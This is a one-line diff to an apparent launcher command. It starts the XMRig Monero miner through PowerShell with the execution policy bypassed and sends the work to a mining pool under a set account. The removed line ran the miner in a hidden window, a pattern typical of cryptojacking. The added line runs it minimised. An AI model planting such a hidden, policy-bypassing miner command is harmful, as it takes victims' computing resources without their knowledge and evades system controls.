@@ -1,1 +1,1 @@
-powershell -W Hidden -Exec Bypass cmd.exe /c %xmrig% -a cryptonight --nicehash --opencl --opencl-loader=OpenCL.dll --cuda --cuda-loader=xmrig-cuda.dll --donate-level=1 -o stratum+tcp://xmr.pool.minergate.com:45700 -u 200813018@myacg.org -p x
+powershell -W Minimised -Exec Bypass cmd.exe /c %xmrig% -a cryptonight --nicehash --opencl --opencl-loader=OpenCL.dll --cuda --cuda-loader=xmrig-cuda.dll --donate-level=1 -o stratum+tcp://xmr.pool.minergate.com:45700 -u 200813018@myacg.org -p x
